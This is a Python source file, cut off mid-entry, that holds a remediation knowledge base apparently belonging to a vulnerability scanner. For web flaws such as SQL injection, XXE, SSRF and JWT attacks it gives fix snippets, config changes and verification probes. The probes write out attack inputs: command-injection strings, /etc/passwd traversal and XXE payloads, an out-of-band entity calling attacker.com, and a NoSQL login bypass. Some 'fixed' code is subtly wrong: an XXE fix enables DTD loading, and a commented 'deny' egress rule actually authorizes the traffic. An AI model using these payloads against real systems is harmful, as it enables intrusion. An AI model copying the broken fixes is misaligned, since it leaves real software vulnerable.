# AI_remediation_engine.py
import json
import time
import hashlib
import logging
import requests
import os
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from collections import defaultdict

GROQ_API_KEY = os.getenv("GROQ_API_KEY", "")

# ---------------------------------------------------------------------------
# Remediation knowledge base — per vuln class, per severity, per tech stack
# Entirely deterministic — no AI needed for base remediation
# ---------------------------------------------------------------------------

# Each entry:
#   title:        human-readable fix title
#   effort:       immediate | short_term | long_term
#   priority:     1 (highest) → 5 (lowest)
#   description:  what to do, in plain language
#   code_snippets: {language: code_string}
#   config_fixes:  {system: config_string}
#   references:   [url_or_name]
#   verification: how to confirm the fix worked

REMEDIATION_KB: Dict[str, Dict] = {

    # ── SQL Injection ───────────────────────────────────────────────────
    "sqli": {
        "title":    "Parameterised Queries / Prepared Statements",
        "effort":   "short_term",
        "priority": 1,
        "description": (
            "Replace all string-concatenated SQL with parameterised queries or an ORM. "
            "Never interpolate user input directly into SQL strings. "
            "Apply input validation as a secondary control, not the primary one."
        ),
        "code_snippets": {
            "python": """\
# VULNERABLE
query = "SELECT * FROM users WHERE id = " + user_id

# FIXED — parameterised query (psycopg2 / MySQLdb)
query  = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))

# FIXED — SQLAlchemy ORM
user = session.query(User).filter(User.id == user_id).first()""",

            "php": """\
// VULNERABLE
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_GET['id']);

// FIXED — prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();""",

            "java": """\
// VULNERABLE
String query = "SELECT * FROM users WHERE id = " + userId;

// FIXED — PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?"
);
ps.setInt(1, userId);
ResultSet rs = ps.executeQuery();""",

            "nodejs": """\
// VULNERABLE
db.query("SELECT * FROM users WHERE id = " + req.params.id);

// FIXED — mysql2 parameterised
db.query("SELECT * FROM users WHERE id = ?", [req.params.id], callback);

// FIXED — Sequelize ORM
User.findOne({ where: { id: req.params.id } });""",

            "csharp": """\
// VULNERABLE
string query = "SELECT * FROM users WHERE id = " + id;

// FIXED — SqlParameter
SqlCommand cmd = new SqlCommand(
    "SELECT * FROM users WHERE id = @id", conn);
cmd.Parameters.AddWithValue("@id", id);""",
        },
        "config_fixes": {
            "mysql": """\
# my.cnf — log slow queries and errors that may indicate injection attempts
[mysqld]
log_error      = /var/log/mysql/error.log
slow_query_log = 1
long_query_time = 2""",

            "modsecurity": """\
# Enable OWASP CRS SQLi rules
SecRuleEngine On
SecRule ARGS "@detectSQLi" \
    "id:942100,phase:2,block,msg:'SQL Injection Attack Detected'"
""",
        },
        "references": [
            "OWASP SQL Injection Prevention Cheat Sheet",
            "CWE-89: Improper Neutralization of Special Elements",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
        ],
        "verification": (
            "Run sqlmap with --level=1 --risk=1 against fixed endpoints. "
            "Zero injectable parameters = remediated. "
            "Also check ORM query logs for any raw string interpolation."
        ),
    },

    # ── XSS ────────────────────────────────────────────────────────────
    "xss": {
        "title":    "Output Encoding + Content Security Policy",
        "effort":   "short_term",
        "priority": 2,
        "description": (
            "Encode all user-supplied data before inserting into HTML, JavaScript, "
            "CSS, or URL contexts. Implement a strict Content Security Policy that "
            "eliminates inline scripts. Use modern frameworks that auto-escape by default."
        ),
        "code_snippets": {
            "python": """\
# VULNERABLE (Flask/Jinja2 — markupsafe disabled)
return "<div>" + user_input + "</div>"

# FIXED — auto-escaping in Jinja2
# In template: {{ user_input }}   ← auto-escaped
# In Python:
from markupsafe import escape
safe_output = escape(user_input)

# CSP header in Flask
@app.after_request
def add_security_headers(response):
    nonce = secrets.token_hex(16)
    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"object-src 'none'; base-uri 'self';"
    )
    return response""",

            "php": """\
// VULNERABLE
echo "<div>" . $_GET['input'] . "</div>";

// FIXED — htmlspecialchars
echo "<div>" . htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8') . "</div>";

// CSP header
header("Content-Security-Policy: default-src 'self'; " .
       "script-src 'self'; object-src 'none';");""",

            "nodejs": """\
// VULNERABLE (Express)
res.send("<div>" + req.query.input + "</div>");

// FIXED — DOMPurify (server-side) + escape-html
const escapeHtml = require('escape-html');
res.send("<div>" + escapeHtml(req.query.input) + "</div>");

// CSP with helmet
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'"],
    objectSrc:  ["'none'"],
  }
}));""",

            "java": """\
// FIXED — OWASP Java Encoder
import org.owasp.encoder.Encode;
String safe = Encode.forHtml(userInput);

// Spring Security CSP header
http.headers()
    .contentSecurityPolicy(
        "default-src 'self'; script-src 'self'; object-src 'none';"
    );""",
        },
        "config_fixes": {
            "nginx": """\
# Add to server block
add_header Content-Security-Policy \
    "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header X-Content-Type-Options "nosniff" always;""",

            "apache": """\
# Add to VirtualHost or .htaccess
Header always set Content-Security-Policy \
    "default-src 'self'; script-src 'self'; object-src 'none';"
Header always set X-XSS-Protection "1; mode=block"
Header always set X-Content-Type-Options "nosniff" """,
        },
        "references": [
            "OWASP XSS Prevention Cheat Sheet",
            "CWE-79: Improper Neutralization of Input During Web Page Generation",
            "https://content-security-policy.com/",
        ],
        "verification": (
            "Run dalfox or XSSHunter against fixed endpoints. "
            "Check CSP header in browser DevTools → Network tab. "
            "Confirm no unsafe-inline or unsafe-eval in production CSP."
        ),
    },

    # ── SSTI ───────────────────────────────────────────────────────────
    "ssti": {
        "title":    "Sandbox Template Engine / Remove User-Controlled Templates",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Never pass user input directly to a template renderer. "
            "If dynamic templates are required, use a sandboxed environment "
            "(Jinja2 SandboxedEnvironment) and whitelist allowed variables. "
            "Prefer server-side data injection over user-controlled template strings."
        ),
        "code_snippets": {
            "python": """\
# VULNERABLE (Jinja2)
from jinja2 import Environment
env = Environment()
template = env.from_string(user_input)   # ← NEVER do this
result = template.render()

# FIXED — SandboxedEnvironment with explicit variable whitelist
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment(
    autoescape    = True,
    undefined     = jinja2.StrictUndefined,
)
# Only pass pre-defined variables — never the template string itself
template = env.from_string("Hello {{ name }}!")
result = template.render(name=user_name)   # user_name ≠ user_input

# BEST — no user-controlled template strings at all
# Store templates server-side, inject only data""",

            "php": """\
// VULNERABLE (Twig)
$twig = new \\Twig\\Environment(new \\Twig\\Loader\\ArrayLoader());
$template = $twig->createTemplate($userInput);  // ← never

// FIXED — load from filesystem, inject only data
$loader   = new \\Twig\\Loader\\FilesystemLoader('/path/to/templates');
$twig     = new \\Twig\\Environment($loader, ['autoescape' => 'html']);
$template = $twig->load('report.html.twig');
echo $template->render(['data' => $safeData]);""",

            "java": """\
// VULNERABLE (Freemarker)
Template t = new Template("name", new StringReader(userInput), cfg);

// FIXED — load from classpath, whitelist data
Template t = cfg.getTemplate("report.ftl");   // server-side only
Map<String, Object> model = new HashMap<>();
model.put("data", sanitizedData);             // never raw user input
t.process(model, out);""",
        },
        "config_fixes": {
            "nginx": """\
# WAF rule — block common SSTI detection payloads
# (ModSecurity / Nginx + lua-resty-waf)
# Block: {{, ${, <%=, #{
location / {
    if ($query_string ~* "(\\{\\{|\\$\\{|<%=|#\\{)") {
        return 403;
    }
}""",
        },
        "references": [
            "PortSwigger SSTI Research",
            "CWE-94: Improper Control of Generation of Code",
            "https://portswigger.net/research/server-side-template-injection",
        ],
        "verification": (
            "Send {{7*7}} and ${7*7} in all user-controlled parameters. "
            "Response must not contain 49. "
            "Attempt jinja2 __subclasses__ chain — must raise an exception or return 400."
        ),
    },

    # ── SSRF ───────────────────────────────────────────────────────────
    "ssrf": {
        "title":    "URL Allowlist + Network Egress Controls",
        "effort":   "short_term",
        "priority": 1,
        "description": (
            "Validate all user-supplied URLs against a strict allowlist of permitted hosts/schemes. "
            "Block requests to private IP ranges, cloud metadata endpoints, and loopback addresses. "
            "Enforce outbound network controls at the infrastructure level."
        ),
        "code_snippets": {
            "python": """\
import ipaddress
import re
from urllib.parse import urlparse

ALLOWED_SCHEMES  = {"https"}
ALLOWED_DOMAINS  = {"api.trusted-partner.com", "cdn.example.com"}
BLOCKED_PREFIXES = [
    "169.254.169.254",  # AWS IMDS
    "metadata.google.internal",
    "169.254.169.254",
    "localhost", "127.", "0.0.0.0",
]
PRIVATE_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
]

def validate_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False
    for prefix in BLOCKED_PREFIXES:
        if (parsed.hostname or "").startswith(prefix):
            return False
    # Resolve and check IP
    import socket
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        if any(ip in net for net in PRIVATE_NETS):
            return False
    except Exception:
        return False
    return True""",

            "php": """\
<?php
function validate_url(string $url): bool {
    $parsed = parse_url($url);
    if ($parsed['scheme'] !== 'https') return false;
    $allowed = ['api.trusted-partner.com'];
    if (!in_array($parsed['host'], $allowed)) return false;
    // Block private ranges
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE
                   | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return true;
}""",

            "nodejs": """\
const dns  = require('dns').promises;
const ipRangeCheck = require('ip-range-check');

const PRIVATE_RANGES = [
    '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16',
    '127.0.0.0/8', '169.254.0.0/16',
];

async function validateUrl(url) {
    const parsed = new URL(url);
    if (parsed.protocol !== 'https:') throw new Error('Scheme not allowed');
    const { address } = await dns.lookup(parsed.hostname);
    if (ipRangeCheck(address, PRIVATE_RANGES))
        throw new Error('Private IP blocked');
    return true;
}""",
        },
        "config_fixes": {
            "aws_vpc": """\
# Security Group — deny all outbound to metadata endpoint
aws ec2 authorize-security-group-egress \\
  --group-id sg-xxxx \\
  --ip-permissions '[{"IpProtocol":"-1","IpRanges":[{"CidrIp":"169.254.169.254/32"}]}]'

# IMDSv2 — require token (makes SSRF → IMDS harder)
aws ec2 modify-instance-metadata-options \\
  --instance-id i-xxxx \\
  --http-tokens required \\
  --http-endpoint enabled""",

            "nginx": """\
# Block outbound SSRF probes via reverse proxy
# If app fetches URLs through nginx proxy_pass:
location /fetch {
    # Deny internal ranges
    deny 10.0.0.0/8;
    deny 172.16.0.0/12;
    deny 192.168.0.0/16;
    deny 127.0.0.0/8;
    deny 169.254.0.0/16;
    allow all;
}""",
        },
        "references": [
            "OWASP SSRF Prevention Cheat Sheet",
            "CWE-918: Server-Side Request Forgery",
            "AWS IMDSv2 Migration Guide",
        ],
        "verification": (
            "Send http://169.254.169.254/latest/meta-data/ as a URL parameter. "
            "Must receive 400/403, not cloud metadata. "
            "Also test http://127.0.0.1/ and http://[::1]/."
        ),
    },

    # ── Command Injection ───────────────────────────────────────────────
    "cmdi": {
        "title":    "Eliminate Shell Calls / Use API Libraries",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Replace all shell command construction using user input with "
            "native API library calls. If a shell is unavoidable, use argument arrays "
            "(never string interpolation) and sanitise with a strict allowlist. "
            "Run the application process with minimum OS privileges."
        ),
        "code_snippets": {
            "python": """\
# VULNERABLE
import subprocess
result = subprocess.run(f"ping -c 1 {user_input}", shell=True)

# FIXED — argument array, shell=False, no interpolation
import subprocess, shlex
# Validate first
if not re.match(r'^[a-zA-Z0-9.\-]{1,253}$', user_input):
    raise ValueError("Invalid hostname")
result = subprocess.run(
    ["ping", "-c", "1", user_input],
    shell=False,          # ← critical
    capture_output=True,
    timeout=5,
)

# BEST — use a library instead of ping
import socket
socket.getaddrinfo(user_input, None)""",

            "php": """\
// VULNERABLE
exec("ping -c 1 " . $_GET['host'], $output);

// FIXED — escapeshellarg + no shell features
$host = escapeshellarg($_GET['host']);
exec("ping -c 1 " . $host, $output);

// BEST — use a PHP DNS library
$dns_result = dns_get_record($_GET['host'], DNS_A);""",

            "nodejs": """\
// VULNERABLE
const { exec } = require('child_process');
exec(`ping -c 1 ${req.query.host}`, callback);

// FIXED — execFile with argument array
const { execFile } = require('child_process');
execFile('ping', ['-c', '1', sanitisedHost], callback);

// BEST — use net/dns module
const dns = require('dns');
dns.lookup(sanitisedHost, callback);""",

            "java": """\
// VULNERABLE
Runtime.getRuntime().exec("ping -c 1 " + userInput);

// FIXED — ProcessBuilder with argument list
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", sanitisedInput);
pb.redirectErrorStream(true);
Process p = pb.start();""",
        },
        "config_fixes": {
            "linux": """\
# Run app as non-root with minimal capabilities
# /etc/systemd/system/app.service
[Service]
User=appuser
NoNewPrivileges=true
CapabilityBoundingSet=
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true""",

            "docker": """\
# Dockerfile — non-root user, no shell in final image
FROM python:3.11-slim
RUN useradd -m -u 1000 appuser
# Remove shells if not needed
RUN rm -f /bin/sh /bin/bash
USER appuser
ENTRYPOINT ["python", "app.py"]""",
        },
        "references": [
            "OWASP Command Injection Defense Cheat Sheet",
            "CWE-78: Improper Neutralization of Special Elements in OS Command",
        ],
        "verification": (
            "Inject '; id', '| id', '`id`', '$(id)' in all user-controlled parameters. "
            "Response must not contain uid=/gid=. "
            "Review all subprocess/exec/system calls in codebase with grep/semgrep."
        ),
    },

    # ── Path Traversal ──────────────────────────────────────────────────
    "path_traversal": {
        "title":    "Path Canonicalisation + Chroot / Jail",
        "effort":   "short_term",
        "priority": 2,
        "description": (
            "Resolve all file paths to their canonical form before access. "
            "Verify the resolved path starts with the expected base directory. "
            "Use chroot jails or OS-level sandboxes to limit filesystem access scope."
        ),
        "code_snippets": {
            "python": """\
import os, pathlib

ALLOWED_BASE = pathlib.Path("/var/app/files").resolve()

def safe_open(user_filename: str):
    # Canonicalise and jail-check
    requested = (ALLOWED_BASE / user_filename).resolve()
    if not str(requested).startswith(str(ALLOWED_BASE)):
        raise PermissionError("Path traversal attempt blocked")
    return open(requested, "rb")""",

            "php": """\
<?php
$base  = realpath('/var/app/files');
$requested = realpath($base . '/' . $_GET['file']);

if ($requested === false || strpos($requested, $base) !== 0) {
    http_response_code(403);
    exit('Access denied');
}
readfile($requested);""",

            "nodejs": """\
const path = require('path');
const BASE = path.resolve('/var/app/files');

function safeReadFile(userInput) {
    const resolved = path.resolve(BASE, userInput);
    if (!resolved.startsWith(BASE + path.sep)) {
        throw new Error('Path traversal blocked');
    }
    return fs.readFileSync(resolved);
}""",

            "java": """\
Path base      = Paths.get("/var/app/files").toRealPath();
Path requested = base.resolve(userInput).normalize();

if (!requested.startsWith(base)) {
    throw new SecurityException("Path traversal attempt");
}
byte[] content = Files.readAllBytes(requested);""",
        },
        "config_fixes": {
            "nginx": """\
# Restrict serving static files to specific directory
location /files/ {
    alias /var/app/files/;
    # Disable directory listing
    autoindex off;
    # Only allow specific extensions
    location ~* \\.(jpg|png|pdf|txt)$ { try_files $uri =404; }
    location ~* \\. { return 403; }
}""",

            "apache": """\
# Disable symlink following and directory listing
Options -FollowSymLinks -Indexes
<Directory /var/app/files>
    Options -Indexes -ExecCGI
    AllowOverride None
    Require all granted
</Directory>""",
        },
        "references": [
            "OWASP Path Traversal",
            "CWE-22: Improper Limitation of a Pathname",
        ],
        "verification": (
            "Send ../../../etc/passwd and ....//....//etc/passwd as file parameters. "
            "Response must return 400/403, not file contents. "
            "Also test %2e%2e%2f URL-encoded variants."
        ),
    },

    # ── XXE ────────────────────────────────────────────────────────────
    "xxe": {
        "title":    "Disable External Entity Processing in XML Parser",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Disable DOCTYPE declarations and external entity resolution in all XML parsers. "
            "If DTD processing is not needed (99% of cases), disable it entirely. "
            "Use modern JSON APIs where possible to avoid XML attack surface."
        ),
        "code_snippets": {
            "python": """\
# VULNERABLE (lxml)
from lxml import etree
tree = etree.parse(user_xml_file)   # ← external entities enabled by default

# FIXED — defusedxml (drop-in replacement)
import defusedxml.ElementTree as ET
tree = ET.parse(user_xml_file)   # ← XXE, XEE, XBomb disabled

# If lxml is required:
parser = etree.XMLParser(
    resolve_entities = False,
    no_network       = True,
    dtd_validation   = False,
    load_dtd         = False,
)
tree = etree.parse(user_xml_file, parser)""",

            "php": """\
<?php
// FIXED — disable external entities
libxml_disable_entity_loader(true);  // PHP < 8.0
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET | LIBXML_DTDLOAD | LIBXML_DTDATTR);

// PHP 8.0+ — libxml_disable_entity_loader removed (safe by default)
// But still set:
$dom->resolveExternals = false;
$dom->substituteEntities = false;""",

            "java": """\
// FIXED — DocumentBuilderFactory hardening
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
dbf.setXIncludeAware(false);
DocumentBuilder db = dbf.newDocumentBuilder();""",

            "csharp": """\
// FIXED — XmlReaderSettings
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing      = DtdProcessing.Prohibit,
    XmlResolver        = null,
    MaxCharactersFromEntities = 1024,
};
using XmlReader reader = XmlReader.Create(stream, settings);""",
        },
        "config_fixes": {
            "spring": """\
# application.properties — disable XML external entities in Spring
spring.mvc.contentnegotiation.favor-path-extension=false

# Java config — global XML hardening
@Bean
public MappingJackson2XmlHttpMessageConverter xmlConverter() {
    XmlMapper mapper = new XmlMapper();
    mapper.configure(
        DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
    // Disable DTD
    mapper.getFactory().getXMLInputFactory()
          .setProperty(XMLInputFactory.SUPPORT_DTD, false);
    return new MappingJackson2XmlHttpMessageConverter(mapper);
}""",
        },
        "references": [
            "OWASP XXE Prevention Cheat Sheet",
            "CWE-611: Improper Restriction of XML External Entity Reference",
            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
        ],
        "verification": (
            "POST: <?xml version='1.0'?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r> "
            "Response must not contain /etc/passwd content. "
            "Also test OOB: <!ENTITY % remote SYSTEM 'http://attacker.com/xxe.dtd'>."
        ),
    },

    # ── NoSQL Injection ─────────────────────────────────────────────────
    "nosql": {
        "title":    "Input Validation for Operator Characters + Schema Enforcement",
        "effort":   "short_term",
        "priority": 1,
        "description": (
            "Reject inputs that contain MongoDB operator prefixes ($gt, $ne, $where). "
            "Use schema validation libraries (Joi, Zod, Marshmallow) to enforce "
            "expected types and shapes before passing to the database. "
            "Never pass raw request body objects directly to Mongoose/MongoDB queries."
        ),
        "code_snippets": {
            "nodejs": """\
// VULNERABLE
User.findOne({ username: req.body.username, password: req.body.password });

// FIXED — Joi schema + operator sanitisation
const Joi = require('joi');
const schema = Joi.object({
    username: Joi.string().alphanum().max(50).required(),
    password: Joi.string().min(8).max(100).required(),
});
const { error, value } = schema.validate(req.body);
if (error) return res.status(400).json({ error: error.details });

// Also strip $ keys recursively
function sanitize(obj) {
    if (typeof obj !== 'object' || !obj) return obj;
    return Object.fromEntries(
        Object.entries(obj)
            .filter(([k]) => !k.startsWith('$'))
            .map(([k, v]) => [k, sanitize(v)])
    );
}
User.findOne(sanitize({ username: value.username, password: value.password }));""",

            "python": """\
# VULNERABLE (PyMongo)
user = db.users.find_one({"username": request.json.get("username"),
                           "password": request.json.get("password")})

# FIXED — explicit type coercion + operator strip
def sanitise_mongo(value):
    if isinstance(value, dict):
        return {k: sanitise_mongo(v) for k, v in value.items()
                if not k.startswith('$')}
    if isinstance(value, list):
        return [sanitise_mongo(i) for i in value]
    return value

username = str(request.json.get("username", ""))[:100]
password = str(request.json.get("password", ""))[:200]
user = db.users.find_one({"username": username, "password": password})""",
        },
        "config_fixes": {
            "mongodb": """\
# mongod.conf — restrict JS execution (disables $where)
security:
  javascriptEnabled: false   # disables $where, mapReduce, group

# Atlas — enable field-level encryption for PII
# Use MongoDB Queryable Encryption for sensitive fields""",
        },
        "references": [
            "OWASP NoSQL Injection",
            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic",
        ],
        "verification": (
            'POST {"username":{"$ne":""},"password":{"$ne":""}} to login endpoint. '
            "Must return 400/401, not a successful auth response."
        ),
    },

    # ── JWT Attacks ─────────────────────────────────────────────────────
    "jwt_attacks": {
        "title":    "Strict JWT Algorithm Pinning + Key Validation",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Pin the expected algorithm explicitly — never use alg: 'none' or allow "
            "the client to specify the algorithm. For RS256, never use the public key "
            "as an HMAC secret. Validate issuer, audience, and expiry on every request."
        ),
        "code_snippets": {
            "python": """\
# VULNERABLE — trusts alg from token header
import jwt
decoded = jwt.decode(token, key, algorithms=jwt.get_unverified_header(token)['alg'])

# FIXED — pin algorithm explicitly
decoded = jwt.decode(
    token,
    key,
    algorithms = ["HS256"],    # ← explicit whitelist, never 'none'
    options    = {"require": ["exp", "iss", "aud"]},
    audience   = "api.example.com",
    issuer     = "auth.example.com",
)""",

            "nodejs": """\
// VULNERABLE
jwt.verify(token, secret);  // allows alg: none

// FIXED — pin algorithm + validate claims
const { jwtVerify } = require('jose');
const secret = new TextEncoder().encode(process.env.JWT_SECRET);

const { payload } = await jwtVerify(token, secret, {
    algorithms: ['HS256'],
    issuer:     'auth.example.com',
    audience:   'api.example.com',
});""",

            "java": """\
// FIXED — JJWT with algorithm enforcement
Jws<Claims> claims = Jwts.parserBuilder()
    .setSigningKey(Keys.hmacShaKeyFor(secret))
    .requireIssuer("auth.example.com")
    .requireAudience("api.example.com")
    .build()
    .parseClaimsJws(token);
// JJWT rejects alg:none and RS256-with-HMAC-secret automatically""",
        },
        "config_fixes": {
            "nginx": """\
# JWT validation at proxy level (nginx-jwt module)
location /api/ {
    auth_jwt "API Zone";
    auth_jwt_key_file /etc/nginx/jwt_public_key.pem;
    auth_jwt_alg     RS256;    # pin algorithm at proxy
}""",
        },
        "references": [
            "RFC 8725 — JSON Web Token Best Current Practices",
            "CWE-347: Improper Verification of Cryptographic Signature",
            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
        ],
        "verification": (
            "Create a token with alg:none and an empty signature. Must be rejected. "
            "Create HS256 token signed with the RS256 public key. Must be rejected. "
            "Verify exp, iss, aud claims are enforced."
        ),
    },

    # ── CORS Misconfiguration ───────────────────────────────────────────
    "cors_misconfiguration": {
        "title":    "CORS Origin Whitelist Enforcement",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Replace wildcard (*) or dynamic unvalidated origin reflection with "
            "a strict whitelist. Never combine Access-Control-Allow-Credentials: true "
            "with a wildcard or reflected origin."
        ),
        "code_snippets": {
            "python": """\
# VULNERABLE (Flask-CORS)
CORS(app, origins="*", supports_credentials=True)   # ← catastrophic

# FIXED
ALLOWED_ORIGINS = {
    "https://app.example.com",
    "https://admin.example.com",
}
@app.after_request
def cors_headers(response):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"]      = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
        response.headers["Vary"] = "Origin"
    return response""",

            "nodejs": """\
// FIXED — cors package with strict origin list
const cors = require('cors');
const ALLOWED = new Set(['https://app.example.com']);

app.use(cors({
    origin: (origin, cb) => {
        if (!origin || ALLOWED.has(origin)) cb(null, true);
        else cb(new Error('CORS policy violation'));
    },
    credentials: true,
}));""",

            "java": """\
// FIXED — Spring CORS configuration
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://app.example.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowCredentials(true)
            .maxAge(3600);
    }
}""",
        },
        "config_fixes": {
            "nginx": """\
# Strict CORS at nginx layer
set $cors_origin "";
if ($http_origin ~* "^https://(app|admin)\\.example\\.com$") {
    set $cors_origin $http_origin;
}
add_header Access-Control-Allow-Origin  $cors_origin always;
add_header Access-Control-Allow-Credentials "true" always;
add_header Vary "Origin" always;""",
        },
        "references": [
            "OWASP CORS Cheat Sheet",
            "CWE-942: Overly Permissive Cross-domain Whitelist",
        ],
        "verification": (
            "Send Origin: https://evil.com header. "
            "ACAO response must not reflect evil.com. "
            "Confirm ACAO: * is not present on any credentialled endpoint."
        ),
    },

    # ── Subdomain Takeover ──────────────────────────────────────────────
    "subdomain_takeover": {
        "title":    "Remove Dangling DNS Records Immediately",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Delete or update CNAME records pointing to unclaimed external resources. "
            "If the external resource is still needed, re-create it and validate ownership. "
            "Implement a DNS audit process to prevent future dangling records."
        ),
        "code_snippets": {
            "bash": """\
#!/bin/bash
# Audit all CNAME records for a domain and check if targets resolve
DOMAIN="example.com"
dig +noall +answer CNAME "$DOMAIN" | while read _ _ _ _ target; do
    if ! host "$target" > /dev/null 2>&1; then
        echo "DANGLING CNAME: $DOMAIN -> $target (NXDOMAIN)"
    fi
done

# Remove a dangling CNAME (AWS Route 53)
aws route53 change-resource-record-sets \\
  --hosted-zone-id Z123456 \\
  --change-batch '{
    "Changes": [{
      "Action": "DELETE",
      "ResourceRecordSet": {
        "Name": "old-subdomain.example.com.",
        "Type": "CNAME",
        "TTL": 300,
        "ResourceRecords": [{"Value": "old-app.azurewebsites.net"}]
      }
    }]
  }'""",

            "python": """\
# Automated dangling DNS detection script
import dns.resolver
import dns.exception

def check_dangling_cnames(subdomains: list) -> list:
    dangling = []
    for sub in subdomains:
        try:
            cname_ans = dns.resolver.resolve(sub, 'CNAME')
            target    = str(cname_ans[0].target).rstrip('.')
            try:
                dns.resolver.resolve(target, 'A')
            except dns.resolver.NXDOMAIN:
                dangling.append({'subdomain': sub, 'cname_target': target})
        except (dns.resolver.NoAnswer, dns.exception.DNSException):
            pass
    return dangling""",
        },
        "config_fixes": {
            "cloudflare": """\
# Cloudflare — enable Domain Takeover Protection
# Dashboard > DNS > Enable Cloudflare registrar
# Or use the API to audit records:
curl -X GET "https://api.cloudflare.com/client/v4/zones/{zone_id}/dns_records?type=CNAME" \\
     -H "Authorization: Bearer {api_token}" | jq '.result[] | select(.content | test("azurewebsites|github.io|herokuapp"))'""",
        },
        "references": [
            "can-i-take-over-xyz project",
            "CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action",
            "https://github.com/EdOverflow/can-i-take-over-xyz",
        ],
        "verification": (
            "After removing CNAME, verify with: dig CNAME subdomain.example.com. "
            "Must return NXDOMAIN or no answer. "
            "Re-run ARTEX takeover scanner — subdomain must no longer appear in results."
        ),
    },

    # ── Open Ports ──────────────────────────────────────────────────────
    "port_exposure": {
        "title":    "Firewall Unnecessary Services + Network Segmentation",
        "effort":   "immediate",
        "priority": 1,
        "description": (
            "Block all inbound traffic to database, admin, and internal service ports "
            "from the public internet. Apply network segmentation — databases must only "
            "be reachable from application servers, not from the internet."
        ),
        "code_snippets": {
            "bash": """\
#!/bin/bash
# UFW — block database ports from internet
ufw deny in 3306/tcp    # MySQL
ufw deny in 5432/tcp    # PostgreSQL
ufw deny in 27017/tcp   # MongoDB
ufw deny in 6379/tcp    # Redis
ufw deny in 9200/tcp    # Elasticsearch
ufw deny in 3389/tcp    # RDP
# Allow only from app server subnet
ufw allow from 10.0.1.0/24 to any port 3306

# iptables equivalent
iptables -A INPUT -p tcp --dport 3306 ! -s 10.0.1.0/24 -j DROP""",
        },
        "config_fixes": {
            "aws_sg": """\
# Revoke public internet access to database port (MySQL example)
aws ec2 revoke-security-group-ingress \\
  --group-id sg-db-xxxx \\
  --protocol tcp \\
  --port 3306 \\
  --cidr 0.0.0.0/0

# Allow only from app server security group
aws ec2 authorize-security-group-ingress \\
  --group-id sg-db-xxxx \\
  --protocol tcp \\
  --port 3306 \\
  --source-group sg-app-xxxx""",

            "redis": """\
# redis.conf — bind to localhost only
bind 127.0.0.1 -::1
protected-mode yes
requirepass "STRONG_RANDOM_PASSWORD_HERE"
# Disable dangerous commands
rename-command FLUSHALL ""
rename-command FLUSHDB  ""
rename-command CONFIG   ""
rename-command DEBUG    "" """,

            "mongodb": """\
# mongod.conf — bind to localhost/app server only
net:
  bindIp: 127.0.0.1,10.0.1.10   # localhost + app server IP only
  port: 27017
security:
  authorization: enabled
  javascriptEnabled: false""",
        },
        "references": [
            "CIS Benchmarks for each service",
            "NIST SP 800-41 — Guidelines on Firewalls and Firewall Policy",
        ],
        "verification": (
            "nmap -sV -p 3306,5432,27017,6379,9200 target_ip from external IP. "
            "All sensitive ports must show 'filtered' or 'closed'. "
            "Re-run ARTEX port scan — risky_ports list must be empty."
        ),
    },

    # ── Missing Security Headers ────────────────────────────────────────
    "missing_security_headers": {
        "title":    "Implement Security Headers via Reverse Proxy",
        "effort":   "immediate",
        "priority": 2,
        "description": (
